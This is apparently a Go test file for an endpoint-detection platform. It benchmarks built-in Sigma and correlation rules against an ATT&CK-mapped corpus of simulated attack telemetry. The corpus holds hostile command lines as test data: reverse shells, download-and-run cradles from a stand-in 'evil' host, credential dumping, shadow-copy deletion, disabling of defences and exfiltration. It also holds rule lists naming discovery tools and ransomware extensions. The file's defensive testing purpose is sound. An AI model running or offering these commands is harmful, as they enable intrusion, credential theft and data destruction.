package detection

import (
	"context"
	"fmt"
	"sort"
	"testing"

	detectionrules "github.com/edr-platform/server/internal/detection/rules"
)

// attackCase is one ATT&CK technique exercised with representative telemetry,
// modelled on Atomic Red Team procedures. The event uses the proto/agent field
// names (imagePath, commandLine, …) exactly as they arrive from FlatMap; the
// production Sigma alias mapping (addPipelineSigmaAliases) is applied before
// evaluation, so this measures the real detection path end-to-end.
type attackCase struct {
	technique string
	name      string
	event     map[string]interface{}
}

// TestATTACKDetectionCoverage runs an ATT&CK-mapped attack corpus through the
// shipped built-in Sigma rules and reports the detection rate. It is an honest
// benchmark: it includes both techniques the built-ins target AND common
// techniques they do not, so the headline number reflects real coverage rather
// than only the rules we wrote.
func TestATTACKDetectionCoverage(t *testing.T) {
	e := NewSigmaEvaluator()
	loaded := LoadBuiltinRules(e)
	t.Logf("built-in Sigma rules loaded: %d", loaded)

	corpus := attackCorpus()

	type result struct {
		c       attackCase
		hit     bool
		ruleHit string
	}
	var results []result
	for _, c := range corpus {
		evt := map[string]interface{}{}
		for k, v := range c.event {
			evt[k] = v
		}
		addPipelineSigmaAliases(evt)
		matches := e.EvaluateEvent(evt)
		r := result{c: c, hit: len(matches) > 0}
		if r.hit {
			r.ruleHit = matches[0].RuleTitle
		}
		results = append(results, r)
	}

	detected := 0
	for _, r := range results {
		if r.hit {
			detected++
		}
	}

	sort.SliceStable(results, func(i, j int) bool {
		if results[i].hit != results[j].hit {
			return results[i].hit && !results[j].hit
		}
		return results[i].c.technique < results[j].c.technique
	})
	t.Log("--- ATT&CK detection results -------------------------------")
	for _, r := range results {
		mark := "MISS"
		extra := ""
		if r.hit {
			mark = "DET "
			extra = " -> " + r.ruleHit
		}
		t.Logf("[%s] %-11s %s%s", mark, r.c.technique, r.c.name, extra)
	}
	rate := float64(detected) / float64(len(results)) * 100
	t.Logf("------------------------------------------------------------")
	t.Logf("ATT&CK detection rate: %d/%d = %.1f%% (built-in Sigma rules only)", detected, len(results), rate)

	// Regression floor: the built-ins must keep detecting a solid core. This is
	// not the headline rate (which includes intentionally-uncovered techniques);
	// it guards against the shipped rules silently breaking.
	const floor = 58
	if detected < floor {
		t.Errorf("detection regressed: only %d techniques detected (floor %d)", detected, floor)
	}
}

// discoveryBurstRule mirrors the value_any behavioral rule shipped in
// migration 004 ("探索コマンドの短時間バースト"). It is the legitimate detection
// path for the discovery cluster that the single-event Sigma benchmark above
// intentionally treats as noise.
const discoveryBurstRule = `
window: 60s
threshold: 4
event_type: process
field: processName
value_any: whoami, tasklist, systeminfo, ipconfig, ifconfig, hostname, net.exe, net1.exe, nltest, quser, qwinsta, arp, route, netstat, wmic, nbtstat, dsquery, sc.exe, reg.exe, findstr, wevtutil
distinct: true
distinct_field: processName
group_by: agent_id
`

// TestATTACKBehavioralCorrelation measures the SequenceEngine correlation path,
// which the single-event Sigma benchmark does NOT exercise. A lone discovery
// command (whoami, tasklist, …) is noise and is correctly ignored single-event;
// but a burst of several distinct discovery commands from one agent within the
// window is a strong post-compromise reconnaissance signal. This test feeds the
// discovery cluster from the ATT&CK corpus through RuleEngine.Evaluate end-to-end
// and confirms the shipped value_any rule catches what single-event rules skip.
func TestATTACKBehavioralCorrelation(t *testing.T) {
	e := detectionrules.NewRuleEngine()
	e.LoadRules([]*detectionrules.DetectionRule{{
		ID: "disc-burst", Name: "Discovery Burst", Type: "behavioral",
		Enabled: true, Severity: 60, Content: discoveryBurstRule,
	}})

	// The discovery-cluster techniques the single-event benchmark misses by design.
	discovery := []struct{ technique, process string }{
		{"T1033", "whoami.exe"},
		{"T1057", "tasklist.exe"},
		{"T1082", "systeminfo.exe"},
		{"T1016", "ipconfig.exe"},
		{"T1018", "net.exe"},     // net view
		{"T1087.002", "net.exe"}, // net group (same binary → not a new distinct tool)
		{"T1518.001", "tasklist.exe"},
	}

	var fired bool
	for _, d := range discovery {
		evt := map[string]interface{}{"type": "process", "agent_id": "host-disc", "processName": d.process}
		m, err := e.Evaluate(context.Background(), evt)
		if err != nil {
			t.Fatalf("Evaluate: %v", err)
		}
		for _, match := range m {
			if match.RuleID == "disc-burst" {
				fired = true
			}
		}
	}

	if !fired {
		t.Fatalf("discovery burst should fire via correlation over the discovery cluster")
	}
	t.Logf("behavioral correlation: discovery cluster (%d techniques) detected via value_any burst rule "+
		"— these are honest single-event MISSes that the SequenceEngine covers", len(discovery))
}

// ransomwareEncryptionRule mirrors the value_any behavioral rule shipped in
// migration 004 ("ランサムウェアによる一括ファイル暗号化"). T1486 in the single-event
// corpus is a lone process event that a generic command-line rule would only
// catch with high false positives; the real ransomware signal is a burst of
// files changing to a ransomware extension, which lives in the file telemetry
// stream and is detected here via correlation.
const ransomwareEncryptionRule = `
window: 60s
threshold: 20
event_type: file
field: path
value_any: .locked, .encrypted, .crypt, .crypto, .enc, .crypted, .cry, .cerber, .locky, .zepto, .wncry, .wcry, .ryuk, .conti, .lockbit, .makop, .phobos, .djvu, .stop, .sage, .globe, .vault, .xtbl, .nemesis, .aes256, .rsa
distinct: true
distinct_field: path
group_by: agent_id
`

// TestATTACKRansomwareCorrelation confirms the T1486 mass-encryption behavior is
// detected via the file-modification-rate correlation path, which the
// single-event Sigma benchmark intentionally treats as an honest MISS.
func TestATTACKRansomwareCorrelation(t *testing.T) {
	e := detectionrules.NewRuleEngine()
	e.LoadRules([]*detectionrules.DetectionRule{{
		ID: "ransom", Name: "Ransomware Mass Encryption", Type: "behavioral",
		Enabled: true, Severity: 90, Content: ransomwareEncryptionRule,
	}})

	// Simulate a ransomware run encrypting 25 distinct files in quick succession.
	var fired bool
	for i := 0; i < 25; i++ {
		evt := map[string]interface{}{
			"type":     "file",
			"agent_id": "host-ransom",
			"path":     fmt.Sprintf(`C:\Users\victim\Documents\file%02d.docx.locked`, i),
		}
		m, err := e.Evaluate(context.Background(), evt)
		if err != nil {
			t.Fatalf("Evaluate: %v", err)
		}
		for _, match := range m {
			if match.RuleID == "ransom" {
				fired = true
			}
		}
	}

	if !fired {
		t.Fatalf("ransomware mass-encryption should fire via file-modification-rate correlation")
	}
	t.Log("behavioral correlation: T1486 ransomware mass-encryption detected via value_any file-rate rule " +
		"— the single-event corpus entry stays an honest MISS by design")
}

func attackCorpus() []attackCase {
	proc := func(image, cmd string) map[string]interface{} {
		return map[string]interface{}{"type": "process", "imagePath": image, "commandLine": cmd, "processName": baseName(image)}
	}
	return []attackCase{
		// ── Covered by built-in rules (expected detections) ─────────────────
		{"T1003", "Mimikatz credential dumping", proc(`C:\tools\mimikatz.exe`, `mimikatz.exe sekurlsa::logonpasswords`)},
		{"T1021.002", "PsExec lateral movement", proc(`C:\tools\PsExec.exe`, `psexec.exe \\victim -s cmd.exe`)},
		{"T1053.005", "schtasks UNC persistence", proc(`C:\Windows\System32\schtasks.exe`, `schtasks /create /tn upd /tr \\srv\share\p.exe /sc onlogon`)},
		{"T1070.001", "Clear Windows event log", proc(`C:\Windows\System32\wevtutil.exe`, `wevtutil cl Security`)},
		{"T1105-cu", "CertUtil download", proc(`C:\Windows\System32\certutil.exe`, `certutil -urlcache -f http://evil/x.exe x.exe`)},
		{"T1105-ba", "BITSAdmin download", proc(`C:\Windows\System32\bitsadmin.exe`, `bitsadmin /transfer j http://evil/x.exe c:\x.exe`)},
		{"T1547.001", "Registry Run key persistence", proc(`C:\Windows\System32\reg.exe`, `reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v evil /d c:\evil.exe`)},
		{"T1562.001", "Disable Defender RTP", proc(`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, `powershell Set-MpPreference -DisableRealtimeMonitoring $true`)},
		{"T1562.004", "Disable firewall via netsh", proc(`C:\Windows\System32\netsh.exe`, `netsh advfirewall set allprofiles state off`)},
		{"T1166", "SUID bit set", proc(`/usr/bin/chmod`, `chmod u+s /tmp/rootbash`)},
		{"T1068", "pkexec CVE-2021-4034", proc(`/usr/bin/pkexec`, `pkexec GCONV_PATH=/tmp/evil charset`)},
		{"T1059.004", "Bash reverse shell", proc(`/usr/bin/bash`, `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`)},
		{"T1105-cl", "curl download to /tmp", proc(`/usr/bin/curl`, `curl http://evil/x -o /tmp/x`)},
		{"T1140", "Base64 decode & exec", proc(`/usr/bin/bash`, `echo ZXZpbA== | base64 -d | bash`)},
		{"T1095", "Netcat exec backdoor", proc(`/usr/bin/ncat`, `ncat -e /bin/bash 10.0.0.1 4444`)},
		{"T1059", "Execute from /tmp", proc(`/tmp/.x/evil`, `/tmp/.x/evil`)},

		// ── NOT covered by built-ins (honest misses — common ATT&CK) ────────
		{"T1059.001", "Encoded PowerShell", proc(`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, `powershell -nop -w hidden -enc SQBFAFgA`)},
		{"T1218.011", "rundll32 proxy exec", proc(`C:\Windows\System32\rundll32.exe`, `rundll32.exe javascript:"..\mshtml,RunHTMLApplication "`)},
		{"T1218.005", "mshta remote payload", proc(`C:\Windows\System32\mshta.exe`, `mshta.exe http://evil/x.hta`)},
		{"T1490", "Delete volume shadow copies", proc(`C:\Windows\System32\vssadmin.exe`, `vssadmin delete shadows /all /quiet`)},
		{"T1136.001", "Create local account", proc(`C:\Windows\System32\net.exe`, `net user hacker P@ssw0rd /add`)},
		{"T1486", "Ransomware-style mass encrypt", proc(`C:\Users\v\enc.exe`, `enc.exe --encrypt C:\Users --ext .locked`)},
		{"T1048", "Exfil via DNS tunneling", proc(`/usr/bin/dig`, `dig @8.8.8.8 leak.evil.com`)},
		{"T1543.003", "Create malicious service", proc(`C:\Windows\System32\sc.exe`, `sc create evil binpath= c:\evil.exe start= auto`)},

		// ── Broader set: high-confidence techniques (rules can/should catch) ─
		{"T1003.001b", "LSASS dump via comsvcs", proc(`C:\Windows\System32\rundll32.exe`, `rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump 624 C:\lsass.dmp full`)},
		{"T1003.002", "SAM hive dump via reg save", proc(`C:\Windows\System32\reg.exe`, `reg save HKLM\SAM C:\sam.save`)},
		{"T1003.003", "NTDS dump via ntdsutil", proc(`C:\Windows\System32\ntdsutil.exe`, `ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q`)},
		{"T1071.001", "PowerShell download cradle", proc(`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, `powershell IEX (New-Object Net.WebClient).DownloadString('http://evil/a.ps1')`)},
		{"T1485", "Data destruction via cipher", proc(`C:\Windows\System32\cipher.exe`, `cipher /w:C:\Users`)},
		{"T1027", "Obfuscation via certutil decode", proc(`C:\Windows\System32\certutil.exe`, `certutil -decode payload.b64 payload.exe`)},

		// ── LOLBin proxy execution (covered by the added built-in rules) ────
		{"T1218.010", "Regsvr32 Squiblydoo", proc(`C:\Windows\System32\regsvr32.exe`, `regsvr32 /s /n /u /i:http://evil/x.sct scrobj.dll`)},
		{"T1047", "WMIC process call create", proc(`C:\Windows\System32\wbem\wmic.exe`, `wmic process call create "cmd.exe /c evil.exe"`)},
		{"T1218.003", "CMSTP INF execution", proc(`C:\Windows\System32\cmstp.exe`, `cmstp.exe /s /ns C:\Users\v\evil.inf`)},
		{"T1055.001b", "Mavinject DLL injection", proc(`C:\Windows\System32\mavinject.exe`, `mavinject.exe 1337 /INJECTRUNNING C:\evil.dll`)},
		{"T1218.004", "InstallUtil proxy exec", proc(`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe`, `installutil.exe /logfile= /LogToConsole=false /U evil.dll`)},
		{"T1070.004", "Delete USN change journal", proc(`C:\Windows\System32\fsutil.exe`, `fsutil usn deletejournal /D C:`)},
		{"T1003.003e", "esentutl VSS ntds extract", proc(`C:\Windows\System32\esentutl.exe`, `esentutl.exe /y /vss C:\Windows\NTDS\ntds.dit /d C:\temp\ntds.dit`)},
		{"T1218.008", "Odbcconf DLL proxy exec", proc(`C:\Windows\System32\odbcconf.exe`, `odbcconf.exe /a {regsvr C:\evil.dll}`)},
		{"T1059.005", "WScript script from Temp", proc(`C:\Windows\System32\wscript.exe`, `wscript.exe C:\Users\v\AppData\Local\Temp\evil.vbs`)},

		// ── Parent-child spawns (covered once parent_resolver injects ParentImage,
		//    as it does in production from ppid) ──────────────────────────────
		{"T1021.006w", "WMI spawning command shell", map[string]interface{}{"type": "process", "imagePath": `C:\Windows\System32\cmd.exe`, "processName": "cmd.exe", "parent_process": "wmiprvse.exe"}},
		{"T1566.001x", "Office macro spawning PowerShell", map[string]interface{}{"type": "process", "imagePath": `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, "processName": "powershell.exe", "parent_process": "winword.exe"}},

		// ── DLL side-loading via image_load telemetry (covered) ────────────
		{"T1574.002", "DLL side-loading (unsigned from Temp)", map[string]interface{}{"type": "image_load", "image_loaded": `C:\Users\v\AppData\Local\Temp\version.dll`, "signature_status": "unsigned", "process_name": "legit.exe"}},

		// ── Deobfuscated malicious script content (covered) ────────────────
		{"T1059.001s", "Fileless PowerShell (ScriptBlock content)", map[string]interface{}{"type": "script", "engine": "powershell", "script_block_text": `IEX (New-Object Net.WebClient).DownloadString('http://evil/a.ps1'); [Reflection.Assembly]::Load($b)`}},

		// ── Linux dynamic linker hijacking via env (covered) ───────────────
		{"T1574.006", "LD_PRELOAD shared-object injection", map[string]interface{}{"type": "process", "imagePath": "/bin/bash", "processName": "bash", "environment": "LD_PRELOAD=/tmp/evil.so PATH=/usr/bin"}},

		// ── LOLBin signed-script / HTML-help proxy execution (covered) ──────
		{"T1216.001", "PubPrn signed-script proxy", proc(`C:\Windows\System32\cscript.exe`, `cscript //nologo C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs x script:http://evil/x.sct`)},
		{"T1218.001", "Compiled HTML Help (hh.exe)", proc(`C:\Windows\System32\hh.exe`, `hh.exe http://evil/x.chm`)},

		// ── Credential access / collection / exfil / C2 (covered) ──────────
		{"T1003.001p", "LSASS dump via ProcDump", proc(`C:\tools\procdump64.exe`, `procdump64.exe -accepteula -ma lsass.exe C:\lsass.dmp`)},
		{"T1218.007", "Msiexec remote MSI install", proc(`C:\Windows\System32\msiexec.exe`, `msiexec /q /i http://evil/payload.msi`)},
		{"T1560.001", "Archive staged data (rar -hp)", proc(`C:\tools\rar.exe`, `rar.exe a -hp"P@ss" C:\exfil.rar C:\Users\v\Documents`)},
		{"T1567.002", "Exfil to cloud via rclone", proc(`C:\tools\rclone.exe`, `rclone copy C:\data remote:bucket --transfers 16`)},
		{"T1572", "Tunneling via ngrok", proc(`C:\tools\ngrok.exe`, `ngrok.exe tcp 3389`)},
		{"T1219", "Remote access software (AnyDesk)", proc(`C:\ProgramData\AnyDesk\AnyDesk.exe`, `AnyDesk.exe --silent --start-service`)},
		{"T1558.003", "Kerberoasting via Rubeus", proc(`C:\tools\Rubeus.exe`, `Rubeus.exe kerberoast /outfile:hashes.txt`)},
		{"T1490w", "Backup catalog deletion (wbadmin)", proc(`C:\Windows\System32\wbadmin.exe`, `wbadmin delete catalog -quiet`)},

		// ── Persistence / impact / credential access (covered) ─────────────
		{"T1546.003", "WMI event subscription persistence", proc(`C:\Windows\System32\wbem\wmic.exe`, `wmic /namespace:\\root\subscription PATH __EventConsumer CREATE Name="evil"`)},
		{"T1489", "Stop security service (net stop)", proc(`C:\Windows\System32\net.exe`, `net stop "Windows Defender Antivirus Service"`)},
		{"T1555.003", "Browser credential theft", proc(`C:\Windows\System32\cmd.exe`, `cmd /c copy "%LocalAppData%\Google\Chrome\User Data\Default\Login Data" C:\temp\`)},
		// UAC bypass is detected at the registry-hijack artifact (not the bare
		// auto-elevating process), modelled here as the registry write.
		{"T1548.002", "UAC bypass via registry hijack", map[string]interface{}{"type": "registry", "keyPath": `HKCU\Software\Classes\ms-settings\shell\open\command`, "valueData": `C:\evil.exe`}},

		// ── Modify Registry: generic reg.exe add (covered by the level:low
		//    reg.exe rule; not a Run/Defender/UAC key so only the generic
		//    T1112 rule attributes it — this is the gap the 2026-07-02 Windows
		//    live run hit as Tactic-only) ──────────────────────────────────
		{"T1112", "Generic registry modification via reg.exe add", proc(`C:\Windows\System32\reg.exe`, `reg add HKCU\Software\Acme\Config /v Debug /t REG_DWORD /d 1 /f`)},

		// ── Broader set: discovery/contextual (honest MISS — single-event
		//    alerts here = noise; these belong to correlation/anomaly engines) ─
		{"T1033", "System owner discovery (whoami)", proc(`C:\Windows\System32\whoami.exe`, `whoami /priv`)},
		{"T1057", "Process discovery (tasklist)", proc(`C:\Windows\System32\tasklist.exe`, `tasklist /v`)},
		{"T1082", "System info discovery", proc(`C:\Windows\System32\systeminfo.exe`, `systeminfo`)},
		{"T1016", "Network config discovery", proc(`C:\Windows\System32\ipconfig.exe`, `ipconfig /all`)},
		{"T1018", "Remote system discovery", proc(`C:\Windows\System32\net.exe`, `net view /domain`)},
		{"T1087.002", "Domain account discovery", proc(`C:\Windows\System32\net.exe`, `net group "Domain Admins" /domain`)},
		{"T1518.001", "Security software discovery", proc(`C:\Windows\System32\tasklist.exe`, `tasklist /svc findstr Defender`)},
		{"T1552.001", "Credentials in files", proc(`C:\Windows\System32\findstr.exe`, `findstr /si password *.config *.xml`)},
	}
}

func baseName(p string) string {
	for i := len(p) - 1; i >= 0; i-- {
		if p[i] == '/' || p[i] == '\\' {
			return p[i+1:]
		}
	}
	return p
}
